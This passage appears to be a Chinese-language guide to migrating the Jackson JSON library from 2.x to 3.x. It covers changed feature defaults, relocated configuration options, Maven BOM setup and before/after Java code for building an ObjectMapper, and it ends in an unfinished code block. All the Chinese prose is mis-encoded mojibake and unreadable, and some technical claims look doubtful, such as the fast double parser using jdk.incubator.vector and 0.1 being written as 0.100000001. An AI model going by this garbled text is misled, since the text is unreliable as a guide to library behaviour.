<table><thead><tr><th>æšä¸¾</th><th>é…ç½®é¡¹</th><th>2.x é»˜è®¤å€¼</th><th>3.x é»˜è®¤å€¼</th><th>å½±å“è¯´æ˜</th></tr></thead><tbody><tr><td>DeserializationFeature</td><td>FAIL_ON_TRAILING_TOKENS</td><td>å…³é—­</td><td>å¼€å¯</td><td>æ ¡éªŒ JSON æœ«å°¾æ˜¯å¦å­˜åœ¨å¤šä½™å­—ç¬¦ï¼ˆå¦‚è§£æå¯¹è±¡åè¿˜æœ‰é¢å¤–çš„é€—å· / å­—ç¬¦ï¼‰ï¼Œæå‡æ•°æ®åˆæ³•æ€§æ ¡éªŒï¼Œä½†ä¼šå¢åŠ å°‘é‡è§£æå¼€é”€ï¼›è‹¥è¾“å…¥æ•°æ®å¯ä¿¡ï¼ˆå¦‚å†…éƒ¨ç³»ç»Ÿäº¤äº’ï¼‰ï¼Œå¯å…³é—­ä»¥æ¢å¤ 2.x æ€§èƒ½ã€‚</td></tr><tr><td/><td>FAIL_ON_UNKNOWN_PROPERTIES</td><td>å¼€å¯</td><td>å…³é—­</td><td>ååºåˆ—åŒ–æ—¶é‡åˆ°ç›®æ ‡ç±»ä¸å­˜åœ¨çš„å­—æ®µï¼Œä¸å†æŠ›å‡º UnrecognizedPropertyExceptionï¼Œè€Œæ˜¯ç›´æ¥å¿½ç•¥ï¼›å¯èƒ½æ©ç›–å­—æ®µåæ‹¼å†™é”™è¯¯ã€æ¥å£å­—æ®µå˜æ›´ç­‰é—®é¢˜ï¼Œå»ºè®®åœ¨æµ‹è¯•ç¯å¢ƒå¼€å¯è¯¥é…ç½®ï¼Œç”Ÿäº§ç¯å¢ƒæŒ‰éœ€å…³é—­ã€‚</td></tr><tr><td/><td>READ_ENUMS_USING_TO_STRING</td><td>å…³é—­</td><td>å¼€å¯ï¼ˆè¿ç§»è‡³ EnumFeatureï¼‰</td><td>ååºåˆ—åŒ–æšä¸¾æ—¶ï¼Œé»˜è®¤æŒ‰ Enum.toString() ç»“æœåŒ¹é…ï¼ˆ2.x é»˜è®¤æŒ‰æšä¸¾åç§° / ç´¢å¼•ï¼‰ï¼›è‹¥æšä¸¾é‡å†™äº† toString()ï¼Œä¼šæ”¹å˜ååºåˆ—åŒ–é€»è¾‘ï¼Œéœ€ç¡®è®¤æšä¸¾å€¼æ˜ å°„è§„åˆ™ï¼Œæˆ–æ˜¾å¼é…ç½® EnumFeature.READ_ENUMS_USING_TO_STRING=false å›é€€ã€‚</td></tr><tr><td/><td>FAIL_ON_NULL_FOR_PRIMITIVES</td><td>å…³é—­</td><td>å¼€å¯</td><td>ååºåˆ—åŒ–æ—¶ï¼Œè‹¥åŸºæœ¬ç±»å‹ï¼ˆint/long/boolean ç­‰ï¼‰å­—æ®µæ¥æ”¶åˆ° null å€¼ï¼Œä¼šæŠ›å‡º DatabindExceptionï¼›2.x ä¼šé»˜è®¤èµ‹å€¼åŸºæœ¬ç±»å‹é»˜è®¤å€¼ï¼ˆå¦‚ int=0ï¼‰ï¼Œå¯èƒ½æš´éœ²ç©ºå€¼å¤„ç†æ¼æ´ï¼Œä½†ä¹Ÿä¼šå¯¼è‡´åŸæœ‰ä¾èµ– â€œç©ºå€¼è½¬é»˜è®¤å€¼â€ çš„ä»£ç æŠ¥é”™ã€‚</td></tr><tr><td>SerializationFeature</td><td>WRITE_ENUMS_USING_TO_STRING</td><td>å…³é—­</td><td>å¼€å¯ï¼ˆè¿ç§»è‡³ EnumFeatureï¼‰</td><td>åºåˆ—åŒ–æšä¸¾æ—¶ï¼Œé»˜è®¤è¾“å‡º Enum.toString() ç»“æœï¼ˆ2.x é»˜è®¤è¾“å‡ºæšä¸¾åç§°ï¼‰ï¼›è‹¥æšä¸¾é‡å†™äº† toString()ï¼Œåºåˆ—åŒ–ç»“æœä¼šå˜åŒ–ï¼Œéœ€ç»Ÿä¸€æšä¸¾åºåˆ—åŒ–è§„åˆ™ï¼Œæˆ–é…ç½® EnumFeature.WRITE_ENUMS_USING_TO_STRING=falseã€‚</td></tr><tr><td/><td>FAIL_ON_EMPTY_BEANS</td><td>å¼€å¯</td><td>å…³é—­</td><td>åºåˆ—åŒ–æ— å±æ€§ / æ—  getter çš„ç©º Bean æ—¶ï¼Œä¸å†æŠ›å‡º JsonMappingExceptionï¼Œè€Œæ˜¯è¾“å‡ºç©ºå¯¹è±¡ {}ï¼›é¿å…å›  Bean ç»“æ„ä¸´æ—¶è°ƒæ•´å¯¼è‡´åºåˆ—åŒ–å¤±è´¥ï¼Œä½†éœ€æ³¨æ„ç©ºå¯¹è±¡å¯èƒ½ä¸ç¬¦åˆä¸‹æ¸¸ç³»ç»Ÿçš„è§£æé¢„æœŸã€‚</td></tr><tr><td/><td>FAIL_ON_ORDER_MAP_BY_INCOMPARABLE_KEY</td><td>å¼€å¯</td><td>å…³é—­</td><td>åºåˆ—åŒ– SortedMap æ—¶ï¼Œè‹¥ Key ä¸å®ç° Comparable æ¥å£ï¼Œä¸å†æŠ›å‡ºå¼‚å¸¸ï¼›2.x ä¼šå¼ºåˆ¶æ ¡éªŒ Key çš„å¯æ¯”è¾ƒæ€§ï¼Œ3.x æ”¾å®½é™åˆ¶ï¼Œä½†å¯èƒ½å¯¼è‡´ Map æ’åºæ··ä¹±ï¼Œéœ€ç¡®ä¿ SortedMap çš„ Key ç¬¦åˆ Comparable è§„èŒƒã€‚</td></tr><tr><td/><td>WRITE_DURATIONS_AS_TIMESTAMPS</td><td>å¼€å¯</td><td>å…³é—­ï¼ˆè¿ç§»è‡³ DateTimeFeatureï¼‰</td><td>åºåˆ—åŒ– java.time.Duration æ—¶ï¼Œé»˜è®¤è¾“å‡º ISO-8601 å­—ç¬¦ä¸²ï¼ˆå¦‚ PT1H30Mï¼‰ï¼Œè€Œé 2.x çš„æ¯«ç§’æ•°æ—¶é—´æˆ³ï¼›éœ€ç¡®è®¤ä¸‹æ¸¸ç³»ç»Ÿæ˜¯å¦å…¼å®¹ Duration çš„å­—ç¬¦ä¸²æ ¼å¼ï¼Œæˆ–é…ç½® DateTimeFeature.WRITE_DURATIONS_AS_TIMESTAMPS=true å›é€€ã€‚</td></tr><tr><td/><td>WRITE_DATES_AS_TIMESTAMPS</td><td>å¼€å¯</td><td>å…³é—­ï¼ˆè¿ç§»è‡³ DateTimeFeatureï¼‰</td><td>åºåˆ—åŒ–æ—¥æœŸæ—¶é—´ç±»å‹ï¼ˆå¦‚ LocalDateTime/Dateï¼‰æ—¶ï¼Œé»˜è®¤è¾“å‡º ISO-8601 å­—ç¬¦ä¸²ï¼ˆå¦‚ 2025-12-09T10:00:00ï¼‰ï¼Œè€Œé 2.x çš„æ¯«ç§’æ—¶é—´æˆ³ï¼›ä¼šæ”¹å˜æ¥å£è¿”å›çš„æ—¥æœŸæ ¼å¼ï¼Œéœ€åŒæ­¥æ›´æ–°å‰ç«¯ / ä¸‹æ¸¸ç³»ç»Ÿçš„è§£æé€»è¾‘ã€‚</td></tr><tr><td/><td>WRITE_DATE_KEYS_AS_TIMESTAMPS</td><td>å…³é—­</td><td>å…³é—­ï¼ˆè¿ç§»è‡³ DateTimeFeatureï¼‰</td><td>æ— é»˜è®¤å€¼å˜åŒ–ï¼Œä½†é…ç½®é¡¹å½’å±ä» SerializationFeature è¿ç§»è‡³ DateTimeFeatureï¼›ä»£ç ä¸­éœ€æ›¿æ¢é…ç½®å¼•ç”¨è·¯å¾„ï¼Œå¦åˆ™ä¼šæŠ¥ â€œé…ç½®é¡¹ä¸å­˜åœ¨â€ é”™è¯¯ã€‚</td></tr><tr><td>StreamReadFeature</td><td>USE_FAST_DOUBLE_PARSER</td><td>å…³é—­</td><td>å¼€å¯</td><td>è§£ææµ®ç‚¹æ•°å­—æ®µæ—¶ä½¿ç”¨æ›´å¿«çš„åŒç²¾åº¦è§£æå™¨ï¼ˆåŸºäº jdk.incubator.vector æˆ–ä¼˜åŒ–ç®—æ³•ï¼‰ï¼›æå‡æµ®ç‚¹æ•°è§£ææ€§èƒ½ï¼Œä½†æç«¯åœºæ™¯ä¸‹å¯èƒ½å­˜åœ¨ç²¾åº¦å·®å¼‚ï¼ˆæ¦‚ç‡æä½ï¼‰ï¼Œéœ€æ ¡éªŒé«˜ç²¾åº¦æµ®ç‚¹æ•°æ®çš„è§£æç»“æœã€‚</td></tr><tr><td/><td>USE_FAST_BIG_NUMBER_PARSER</td><td>å…³é—­</td><td>å¼€å¯</td><td>è§£æå¤§æ•°å­—ï¼ˆå¦‚ BigDecimal/BigIntegerï¼‰æ—¶ä½¿ç”¨ä¼˜åŒ–è§£æå™¨ï¼›æå‡å¤§æ•°å­—è§£ææ•ˆç‡ï¼Œæ— å…¼å®¹æ€§é£é™©ï¼Œä½†éœ€ç¡®ä¿è§£æåçš„å¤§æ•°ç²¾åº¦ç¬¦åˆä¸šåŠ¡è¦æ±‚ã€‚</td></tr><tr><td>StreamWriteFeature</td><td>USE_FAST_DOUBLE_WRITER</td><td>å…³é—­</td><td>å¼€å¯</td><td>åºåˆ—åŒ–æµ®ç‚¹æ•°æ—¶ä½¿ç”¨æ›´å¿«çš„åŒç²¾åº¦å†™å…¥å™¨ï¼›æå‡æµ®ç‚¹æ•°å­—æ®µåºåˆ—åŒ–æ€§èƒ½ï¼Œæç«¯åœºæ™¯å¯èƒ½å­˜åœ¨å°æ•°ä½è¾“å‡ºæ ¼å¼å·®å¼‚ï¼ˆå¦‚ 0.1 å˜ä¸º 0.100000001ï¼‰ï¼Œéœ€æ ¡éªŒé‡‘è / é«˜ç²¾åº¦åœºæ™¯çš„æµ®ç‚¹è¾“å‡ºã€‚</td></tr><tr><td>TokenStreamFactory.Feature</td><td>INTERN_PROPERTY_NAMES</td><td>å¯ç”¨</td><td>å…³é—­</td><td>ä¸å†å¯¹ JSON å±æ€§åè¿›è¡Œå­—ç¬¦ä¸²é©»ç•™ï¼ˆString Internï¼‰ï¼›å‡å°‘å†…å­˜å ç”¨ï¼ˆé¿å…å¸¸é‡æ± è†¨èƒ€ï¼‰ï¼Œä½†é¢‘ç¹è§£æç›¸åŒå±æ€§åçš„ JSON æ—¶ï¼Œä¼šå¢åŠ å­—ç¬¦ä¸²åˆ›å»ºå¼€é”€ï¼Œé«˜å¹¶å‘åœºæ™¯å¯æŒ‰éœ€é‡æ–°å¼€å¯ã€‚</td></tr><tr><td>MapperFeature</td><td>USE_STD_BEAN_NAMING</td><td>å…³é—­</td><td>ç§»é™¤ï¼ˆå§‹ç»ˆå¯ç”¨ï¼‰</td><td>å¼ºåˆ¶ä½¿ç”¨æ ‡å‡† JavaBean å‘½åè§„èŒƒï¼ˆå¦‚ getXxx() å¯¹åº”å­—æ®µ xxxï¼‰ï¼›2.x éœ€æ‰‹åŠ¨å¼€å¯ï¼Œ3.x å†…ç½®ç”Ÿæ•ˆï¼Œè‹¥ä»£ç ä¾èµ–éæ ‡å‡†å‘½åï¼ˆå¦‚ getXXX() å¯¹åº” XXXï¼‰ï¼Œä¼šå¯¼è‡´å­—æ®µåºåˆ—åŒ– / ååºåˆ—åŒ–å¤±è´¥ã€‚</td></tr><tr><td/><td>AUTO_DETECT_xxxï¼ˆCREATORS/FIELDS/GETTERS/IS_GETTERS/SETTERSï¼‰</td><td>å¼€å¯</td><td>ç§»é™¤</td><td>ä¸å†è‡ªåŠ¨æ£€æµ‹ Bean çš„åˆ›å»ºå™¨ / å­—æ®µ / è®¿é—®å™¨ï¼Œéœ€æ˜¾å¼é…ç½®å¯è§æ€§è§„åˆ™ï¼›2.x ä¾èµ–è‡ªåŠ¨æ£€æµ‹çš„åœºæ™¯ï¼ˆå¦‚æ— æ³¨è§£çš„ç§æœ‰å­—æ®µåºåˆ—åŒ–ï¼‰ä¼šå¤±æ•ˆï¼Œéœ€é€šè¿‡ changeDefaultVisibility é…ç½®å­—æ®µ / æ–¹æ³•çš„å¯è§æ€§ã€‚</td></tr><tr><td/><td>ALLOW_FINAL_FIELDS_AS_MUTATORS</td><td>å¯ç”¨</td><td>å…³é—­</td><td>ç¦æ­¢é€šè¿‡åå°„ä¿®æ”¹ final å­—æ®µçš„å€¼ï¼›2.x å…è®¸å¼ºåˆ¶ä¿®æ”¹ final å­—æ®µï¼ˆéè§„èŒƒè¡Œä¸ºï¼‰ï¼Œ3.x ç¦ç”¨åï¼Œä¾èµ– â€œfinal å­—æ®µååºåˆ—åŒ–èµ‹å€¼â€ çš„ä»£ç ä¼šæŠ¥é”™ï¼Œéœ€æ”¹ä¸ºé€šè¿‡æ„é€ å™¨ / å·¥å‚æ–¹æ³•åˆå§‹åŒ– final å­—æ®µã€‚</td></tr><tr><td/><td>DEFAULT_VIEW_INCLUSION</td><td>å¯ç”¨</td><td>å…³é—­</td><td>æœªæŒ‡å®š @JsonView æ—¶ï¼Œä¸å†é»˜è®¤åºåˆ—åŒ–æ‰€æœ‰å­—æ®µï¼Œä»…åºåˆ—åŒ–æ—  View æ³¨è§£çš„å­—æ®µï¼›è‹¥ä»£ç ä¾èµ– â€œé»˜è®¤åŒ…å«æ‰€æœ‰å­—æ®µâ€ çš„é€»è¾‘ï¼Œéœ€æ˜¾å¼é…ç½® MapperFeature.DEFAULT_VIEW_INCLUSION=trueï¼Œæˆ–è¡¥å…¨ @JsonView æ³¨è§£ã€‚</td></tr><tr><td/><td>USE_GETTERS_AS_SETTERS</td><td>å¯ç”¨</td><td>å…³é—­</td><td>ä¸å†å°† getXxx() æ–¹æ³•å½“ä½œ setXxx() ä½¿ç”¨ï¼ˆå¦‚ååºåˆ—åŒ–é›†åˆå­—æ®µæ—¶è°ƒç”¨ getter è·å–é›†åˆåæ·»åŠ å…ƒç´ ï¼‰ï¼›2.x ä¸ºå…¼å®¹ JAXB çš„éè§„èŒƒè¡Œä¸ºï¼Œ3.x ç¦ç”¨åï¼Œéœ€ä¸ºé›†åˆ / æ˜ å°„å­—æ®µæ·»åŠ æ˜¾å¼çš„ setter æ–¹æ³•ã€‚</td></tr><tr><td/><td>SORT_PROPERTIES_ALPHABETICALLY</td><td>å…³é—­</td><td>å¼€å¯</td><td>åºåˆ—åŒ– POJO æ—¶é»˜è®¤æŒ‰å­—æ®µåå­—æ¯æ’åºè¾“å‡ºï¼›2.x æŒ‰å­—æ®µå®šä¹‰é¡ºåºè¾“å‡ºï¼Œ3.x æ”¹å˜è¾“å‡ºé¡ºåºï¼Œå¯èƒ½å¯¼è‡´ä¾èµ–å­—æ®µé¡ºåºçš„ç­¾åæ ¡éªŒï¼ˆå¦‚ MD5 éªŒç­¾ï¼‰å¤±è´¥ï¼Œéœ€æ˜¾å¼é…ç½® @JsonPropertyOrder å›ºå®šé¡ºåºã€‚</td></tr><tr><td/><td>OVERRIDE_PUBLIC_ACCESS_MODIFIERS</td><td>å¯ç”¨</td><td>å…³é—­</td><td>ä¸å†è¦†ç›–å…¬å…±å­—æ®µ / æ–¹æ³•çš„è®¿é—®ä¿®é¥°ç¬¦ï¼ˆå¦‚å¼ºåˆ¶è®¿é—® public final æ–¹æ³•ï¼‰ï¼›2.x å¯é€šè¿‡åå°„çªç ´è®¿é—®é™åˆ¶ï¼Œ3.x ç¦ç”¨åï¼Œéœ€ç¡®ä¿ Bean çš„å­—æ®µ / æ–¹æ³•è®¿é—®æƒé™ç¬¦åˆåºåˆ—åŒ–è¦æ±‚ï¼ˆå¦‚ public getterï¼‰ã€‚</td></tr><tr><td>DateTimeFeature</td><td>ONE_BASED_MONTHS</td><td>å…³é—­</td><td>å¼€å¯</td><td>è§£æ / åºåˆ—åŒ–æ—¥æœŸæ—¶ï¼Œæœˆä»½æŒ‰ â€œ1 åŸºâ€ å¤„ç†ï¼ˆ1=1 æœˆï¼Œ12=12 æœˆï¼‰ï¼›2.x éƒ¨åˆ†åœºæ™¯ä¸º â€œ0 åŸºâ€ï¼ˆ0=1 æœˆï¼‰ï¼Œä¿®å¤äº†æœˆä»½è§£æçš„åç›´è§‰é—®é¢˜ï¼Œä½†éœ€æ ¡éªŒè€æ•°æ®ä¸­ â€œ0 åŸºæœˆä»½â€ çš„å…¼å®¹æ€§ï¼ˆå¦‚ 2025-00-09 ä¼šè§£æå¤±è´¥ï¼‰ã€‚</td></tr><tr><td>StreamReadConstraints</td><td>DEFAULT_MAX_DEPTH</td><td>1000</td><td>500</td><td>JSON åµŒå¥—è§£æçš„æœ€å¤§æ·±åº¦ä» 1000 é™è‡³ 500ï¼›é™åˆ¶æ·±å±‚åµŒå¥— JSON çš„è§£æï¼Œé˜²æ­¢æ ˆæº¢å‡ºæ”»å‡»ï¼Œä½†è§£æè¶…è¿‡ 500 å±‚çš„åµŒå¥— JSON æ—¶ä¼šæŠ›å‡º StreamConstraintsExceptionï¼Œéœ€è°ƒæ•´è¶…å¤§åµŒå¥— JSON çš„è§£æé™åˆ¶ã€‚</td></tr><tr><td>StreamWriteConstraints</td><td>DEFAULT_MAX_DEPTH</td><td>1000</td><td>500</td><td>JSON åµŒå¥—åºåˆ—åŒ–çš„æœ€å¤§æ·±åº¦ä» 1000 é™è‡³ 500ï¼›åºåˆ—åŒ–æ·±å±‚åµŒå¥—å¯¹è±¡ï¼ˆå¦‚é€’å½’å¼•ç”¨çš„å¯¹è±¡ï¼‰æ—¶ä¼šæå‰ç»ˆæ­¢ï¼Œéœ€ä¼˜åŒ–å¯¹è±¡ç»“æ„ï¼Œæˆ–é€šè¿‡ StreamWriteConstraints.builder().maxDepth(1000) è°ƒæ•´é™åˆ¶ã€‚</td></tr></tbody></table>
<p><strong>4. åŠŸèƒ½æ‹†åˆ†ä¸è¿ç§»</strong></p>
<ul>
<li><strong>æµå¼ API ç‰¹æ€§æ‹†åˆ†ï¼š</strong> JsonParser.FeatureÂ â†’Â StreamReadFeatureï¼ˆé€šç”¨ï¼‰+Â JsonReadFeatureï¼ˆJSON ä¸“ç”¨ï¼‰ï¼›
JsonGenerator.FeatureÂ â†’Â StreamWriteFeatureÂ +Â JsonWriteFeatureï¼ˆå…¶ä»–æ ¼å¼å¦‚ XML/YAML åŒç†ï¼‰ã€‚</li>
<li><strong>è¿ç§»é…ç½®ï¼š</strong></li>
</ul>









































































































<table><thead><tr><th>å±æ€§/æ–¹æ³•</th><th>åŸä½ç½®</th><th>è¿ç§»ä½ç½®</th></tr></thead><tbody><tr><td>ADJUST_DATES_TO_CONTEXT_TIME_ZONE</td><td>DeserializationFeatureÂ Â </td><td>DateTimeFeature</td></tr><tr><td>READ_DATE_TIMESTAMPS_AS_NANOSECONDSÂ </td><td>DeserializationFeatureÂ Â </td><td>DateTimeFeature</td></tr><tr><td>FAIL_ON_NUMBERS_FOR_ENUMSÂ </td><td>DeserializationFeatureÂ Â </td><td>EnumFeatureÂ </td></tr><tr><td>READ_ENUMS_USING_TO_STRINGÂ Â </td><td>DeserializationFeatureÂ Â </td><td>EnumFeatureÂ </td></tr><tr><td>READ_UNKNOWN_ENUM_VALUES_AS_NULLÂ </td><td>DeserializationFeatureÂ Â </td><td>EnumFeatureÂ </td></tr><tr><td>READ_UNKNOWN_ENUM_VALUES_USING_DEFAULT_VALUEÂ </td><td>DeserializationFeatureÂ Â </td><td>EnumFeatureÂ </td></tr><tr><td>WRITE_DATES_AS_TIMESTAMPSÂ </td><td>SerializationFeatureÂ </td><td>DateTimeFeature</td></tr><tr><td>WRITE_DATE_KEYS_AS_TIMESTAMPS</td><td>SerializationFeatureÂ </td><td>DateTimeFeature</td></tr><tr><td>WRITE_DATE_TIMESTAMPS_AS_NANOSECONDS</td><td>SerializationFeatureÂ </td><td>DateTimeFeature</td></tr><tr><td>WRITE_DATES_WITH_CONTEXT_TIME_ZONE</td><td>SerializationFeatureÂ </td><td>DateTimeFeature</td></tr><tr><td>WRITE_DURATIONS_AS_TIMESTAMPS</td><td>SerializationFeatureÂ </td><td>DateTimeFeature</td></tr><tr><td>WRITE_DATES_WITH_ZONE_ID</td><td>SerializationFeatureÂ </td><td>DateTimeFeature</td></tr><tr><td>WRITE_ENUMS_USING_TO_STRINGÂ </td><td>SerializationFeatureÂ </td><td>EnumFeatureÂ </td></tr><tr><td>WRITE_ENUMS_USING_INDEXÂ </td><td>SerializationFeatureÂ </td><td>EnumFeatureÂ </td></tr><tr><td>WRITE_ENUM_KEYS_USING_INDEXÂ </td><td>SerializationFeatureÂ </td><td>EnumFeatureÂ </td></tr><tr><td>createContextual()</td><td>ContextualDeserializerÂ </td><td>ValueDeserializer</td></tr><tr><td>createContextual()</td><td>ContextualSerializerÂ Â </td><td>ValueSerializer</td></tr><tr><td>resolve()</td><td>ResolvableDeserializerÂ Â Â </td><td>ValueDeserializer</td></tr><tr><td>resolve()</td><td>ResolvableSerializerÂ Â Â Â </td><td>ValueSerializer</td></tr></tbody></table>
<h2 data-id="heading-2">ä¸‰ã€æ³¨æ„äº‹é¡¹ï¼ˆé¿å‘å…³é”®ï¼‰</h2>
<p><strong>1. ä¾èµ–ç®¡ç†å»ºè®®</strong></p>
<p>ä¼˜å…ˆä½¿ç”¨Â jackson-bomÂ ç»Ÿä¸€ç‰ˆæœ¬ï¼ˆé¿å…Â jackson-annotationsÂ ç‰ˆæœ¬å†²çªï¼‰ï¼š</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependencyManagement</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>tools.jackson<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>jackson-bom<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.0.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>import<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">type</span>&gt;</span>pom<span class="hljs-tag">&lt;/<span class="hljs-name">type</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependencyManagement</span>&gt;</span>
</code></pre>
<p>æ— éœ€æ‰‹åŠ¨å¼•å…¥Â jackson-coreÂ å’ŒÂ jackson-annotationsï¼Œjackson-databindÂ ä¼šè‡ªåŠ¨ä¼ é€’ä¾èµ–ã€‚</p>
<p><strong>2. ä»£ç æ”¹é€ æ³¨æ„</strong></p>
<p><strong>ObjectMapper æ„å»ºï¼š</strong> å¿…é¡»ç”¨ Builder æ¨¡å¼ï¼Œç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 3.x æ­£ç¡®å†™æ³•</span>
<span class="hljs-type">JsonMapper</span> <span class="hljs-variable">mapper</span> <span class="hljs-operator">=</span> JsonMapper.builder()
    .enable(JsonWriteFeature.ESCAPE_NON_ASCII)
    .changeDefaultPropertyInclusion(incl -&gt; incl.withValueInclusion(JsonInclude.Include.NON_NULL))
    .build();

<span class="hljs-comment">// é‡æ–°é…ç½®å·²æœ‰ mapperï¼ˆä¸å¯å˜å¯¹è±¡æ— æ³•ç›´æ¥ä¿®æ”¹ï¼‰</span>
<span class="hljs-type">JsonMapper</span> <span class="hljs-variable">newMapper</span> <span class="hljs-operator">=</span> mapper.rebuild()
    .enable(SerializationFeature.INDENT_OUTPUT)
    .build();
</code></pre>
<p><strong>æ³›å‹ç±»å‹æ ¡éªŒï¼š</strong> LaissezFaireSubTypeValidatorÂ ä¸å†å…¬å¼€ï¼Œéœ€ç”¨Â BasicPolymorphicTypeValidatorÂ æ„å»ºï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">BasicPolymorphicTypeValidator</span> <span class="hljs-variable">validator</span> <span class="hljs-operator">=</span> BasicPolymorphicTypeValidator.builder()
    .allowIfSubType(<span class="hljs-string">"com.example"</span>)
    .build();
</code></pre>
<p><strong>æ—¥æœŸæ ¼å¼/æ—¶åŒºé…ç½®ï¼š</strong>
UTC çš„é»˜è®¤å½¢å¼ç°åœ¨å°¾éƒ¨æ˜¯Â ZÂ ï¼Œè€Œä¸æ˜¯åƒ 2.x ç‰ˆæœ¬ä¸­çš„Â Â +00Â ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">//é”™è¯¯çš„æ–¹å¼</span>
mapper.setDateFormat(<span class="hljs-keyword">new</span> <span class="hljs-title class_">SimpleDateFormat</span>(<span class="hljs-string">"yyyy-MM-dd'T'HH:mm:ssZ"</span>));
mapper.setTimeZone(TimeZone.getDefault());

<span class="hljs-comment">//æ­£ç¡®çš„æ–¹å¼</span>
<span class="hljs-type">ObjectMapper</span> <span class="hljs-variable">mapper</span> <span class="hljs-operator">=</span> JsonMapper.builder()
.defaultDateFormat(<span class="hljs-keyword">new</span> <span class="hljs-title class_">SimpleDateFormat</span>(<span class="hljs-string">"yyyy-MM-dd'T'HH:mm:ssZ"</span>))
.defaultTimeZone(TimeZone.getDefault())
.build();
</code></pre>
<p><strong>åºåˆ—åŒ–é…ç½®ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">//é”™è¯¯çš„æ–¹å¼</span>
mapper.setSerializationInclusion(JsonInclude.Include.NON_NULL);

<span class="hljs-comment">//æ­£ç¡®çš„æ–¹å¼</span>
<span class="hljs-type">ObjectMapper</span> <span class="hljs-variable">mapper</span> <span class="hljs-operator">=</span> JsonMapper.builder()
  .changeDefaultPropertyInclusion(incl -&gt; incl.withValueInclusion(JsonInclude.Include.NON_NULL))
  .changeDefaultPropertyInclusion(incl -&gt; incl.withContentInclusion(JsonInclude.Include.NON_NULL))
  .build();

</code></pre>
<p><strong>å¯è§æ€§é…ç½®ï¼š</strong> MapperFeature.AUTO_DETECT_XXXÂ å·²ç§»é™¤ï¼Œéœ€é€šè¿‡Â changeDefaultVisibilityÂ é…ç½®ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">//é”™è¯¯çš„æ–¹å¼</span>
mapper.disable(MapperFeature.AUTO_DETECT_FIELDS);

<span class="hljs-comment">//æ­£ç¡®çš„æ–¹å¼</span>
<span class="hljs-type">ObjectMapper</span> <span class="hljs-variable">mapper</span> <span class="hljs-operator">=</span> JsonMapper.builder()
    .changeDefaultVisibility(vc -&gt;
        vc.withFieldVisibility(JsonAutoDetect.Visibility.NONE))
.build();

</code></pre>
<p><strong>åŒ…å«ç±»å‹ä¿¡æ¯é…ç½®ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">//é”™è¯¯çš„æ–¹å¼</span>

mapper.activateDefaultTypingAsProperty(LaissezFaireSubTypeValidator.instance,
    ObjectMapper.DefaultTyping.NON_CONCRETE_AND_ARRAYS,
    <span class="hljs-string">"@class"</span>);
    
 <span class="hljs-comment">//æ­£ç¡®çš„æ–¹å¼</span>
 
<span class="hljs-type">var</span> <span class="hljs-variable">typeValidator</span> <span class="hljs-operator">=</span> BasicPolymorphicTypeValidator.builder()
        .allowIfSubType(<span class="hljs-string">"my.package.base.name."</span>)
        .allowIfSubType(<span class="hljs-string">"java.util.concurrent."</span>)
        .allowIfSubTypeIsArray()
        <span class="hljs-comment">// ...</span>
        .build();
        
<span class="hljs-type">ObjectMapper</span> <span class="hljs-variable">mapper</span> <span class="hljs-operator">=</span> JsonMapper.builder()
    .activateDefaultTypingAsProperty(typeValidator, DefaultTyping.NON_CONCRETE_AND_ARRAYS, <span class="hljs-string">"@class"</span>)
.build();
   
</code></pre>
<p><strong>JsonNode å¤„ç†ä¸­çš„ DecimalNode åˆ›å»ºç­–ç•¥</strong>
é€šè¿‡Â JsonNodeFactoryÂ åˆ›å»ºÂ DecimalNodeÂ æ—¶ï¼Œæ—§è¡Œä¸ºï¼šå¯èƒ½ä¼šè‡ªåŠ¨æˆªæ–­å°¾éšé›¶ï¼ˆå¦‚Â 1.200Â â†’Â 1.2ï¼‰æ–°è¡Œä¸ºï¼šé»˜è®¤ä¸æˆªæ–­å°¾éšé›¶ï¼Œä¿æŒæœ€å°é™åº¦ä¿®å‰ª</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ç¤ºä¾‹ï¼šä¸åŒçš„è¡¨ç¤ºæ–¹å¼</span>
<span class="hljs-type">BigDecimal</span> <span class="hljs-variable">value1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BigDecimal</span>(<span class="hljs-string">"1.200"</span>);  <span class="hljs-comment">// ä¸‰ä½å°æ•°</span>
<span class="hljs-type">BigDecimal</span> <span class="hljs-variable">value2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BigDecimal</span>(<span class="hljs-string">"1.2"</span>);     <span class="hljs-comment">// ä¸€ä½å°æ•°</span>

<span class="hljs-comment">// æ–°è¡Œä¸ºï¼šDecimalNodeä¼šä¿æŒåŸå§‹ç²¾åº¦</span>
<span class="hljs-comment">// value1 ä»ä¼šè¡¨ç¤ºä¸º "1.200"</span>
<span class="hljs-comment">// value2 ä»ä¼šè¡¨ç¤ºä¸º "1.2"</span>
</code></pre>
<p><strong>Month åºåˆ—åŒ–/ååºåˆ—åŒ–è¡Œä¸ºå˜æ›´</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// java.time.Month æšä¸¾</span>
